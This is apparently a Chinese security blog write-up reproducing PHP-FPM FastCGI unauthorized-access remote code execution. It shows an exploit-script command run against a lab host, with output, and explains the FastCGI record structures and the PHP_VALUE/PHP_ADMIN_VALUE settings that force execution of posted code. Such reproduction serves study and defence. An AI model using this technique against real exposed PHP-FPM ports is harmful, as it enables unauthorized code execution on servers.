---
title: PHP-FPM Fastcgi 未授权访问漏洞
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-03T20:33:40+08:00
categories: 
- 渗透测试
- 漏洞复现
- Php
---

### 漏洞复现

脚本地址:

https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

```
┌──(root㉿kali)-[~/Desktop/tools/php-cve]
└─# python fpm.py "192.168.121.140" -c "<?system('id');?>" -p "9000" /usr/local/lib/php/System.php
X-Powered-By: PHP/8.1.1
Content-type: text/html; charset=UTF-8

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

该脚本包含4个参数，需要手动设置目标服务器下具有的php文件用于执行代码

![fpm](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\fpm.png)

### 原理分析

#### Fastcgi

FastCGI（Fast Common Gateway Interface）是一种用于处理动态内容的协议，它可以提高Web服务器和外部程序之间的通信效率。与传统的CGI协议相比，FastCGI能够更高效地处理动态请求，并且具有更好的性能和可伸缩性。FastCGI通过在Web服务器和外部程序之间建立一个持久的连接，可以重用进程或线程来处理多个请求

```
FastCGI的工作流程如下：
Web服务器接收到客户端的请求。
Web服务器将请求转发给FastCGI进程管理器。
FastCGI进程管理器选择一个可用的FastCGI应用程序进程。
Web服务器将请求数据发送给FastCGI应用程序进程。
FastCGI应用程序进程处理请求并生成响应数据。
FastCGI应用程序进程将响应数据发送回Web服务器。
Web服务器将响应数据返回给客户端。
```

**Record**

```c
typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
```

fastcgi通过record头中的contentLength来获取需要从tcp数据流中需要读取的数据大小

**Type**

![record-type](E:\笔记软件\笔记\渗透测试\漏洞复现\Php\record-type.png)

fastcgi中的type有上述图中的7种，需要注意的是第四种，也是本漏洞所利用的点，当接收到type为4时，将record的body解析为key-value的形式存储在环境变量中

```c
typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair11;

typedef struct {
  unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair14;

typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength];
} FCGI_NameValuePair41;

typedef struct {
  unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */
  unsigned char nameLengthB2;
  unsigned char nameLengthB1;
  unsigned char nameLengthB0;
  unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */
  unsigned char valueLengthB2;
  unsigned char valueLengthB1;
  unsigned char valueLengthB0;
  unsigned char nameData[nameLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
  unsigned char valueData[valueLength
          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];
} FCGI_NameValuePair44;
```

1. key、value均小于128字节，用`FCGI_NameValuePair11`
2. key大于128字节，value小于128字节，用`FCGI_NameValuePair41`
3. key小于128字节，value大于128字节，用`FCGI_NameValuePair14`
4. key、value均大于128字节，用`FCGI_NameValuePair44`

#### PHP-FPM

php-fpm是一种fastcgi进程管理器，当Web服务器接收到对PHP文件的请求时，它通过FastCGI协议将请求转发给PHP-FPM。PHP-FPM将请求分配给进程池中的一个可用的PHP工作进程来处理。一旦PHP脚本的执行完成，响应将被发送回Web服务器，由其传递给客户端。

当用户访问`http://127.0.0.1/index.php?a=1&b=2`时，若web目录是/var/www/html，则nginx会将请求解析为key_value

```nginx
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

SCRIPT_FILENAME参数指向绝对路径的php文件，即告诉服务器需要执行哪个文件

#### 任意代码执行

当pgp-fpm的9000端口暴露在公网上时，我们可以自行构造fastcgi协议与fpm进行通信，前提条件是我们所选的SCRIPT_FILENAME需要在目标服务器上存在，并且是绝对路径，所以通常选择的都是php安装源所拥有的默认php文件，例如/usr/local/lib/php/PEAR.php

怎么让目标php文件执行我们的命令，这就需要用到php的配置项auto_prepend_file`和`auto_append_file

```
auto_prepend_file（自动前置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之前自动包含。这意味着在执行脚本的代码之前，会先执行auto_prepend_file中指定的文件中的代码。这个文件通常用于定义全局变量、函数或者执行一些必要的初始化操作。

auto_append_file（自动后置文件）：该指令用于指定一个文件路径，该文件将在每个PHP脚本执行之后自动包含。这意味着在执行完脚本的代码后，会执行auto_append_file中指定的文件中的代码。这个文件通常用于执行一些清理操作、记录日志或者输出一些额外的内容。
```

通过指定auto_prepend_file为`php://input`在每个文件执行前包含post提交的内容(需要开启allow_url_include启动远程文件包含选项)

auto_prepend_file的值通过php-fpm中的两个环境变量来设置PHP_VALUE`和`PHP_ADMIN_VALUE；对这两个环境变量进行设置

```c
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
```

与请求一同发送，就可以执行post提交的任意参数

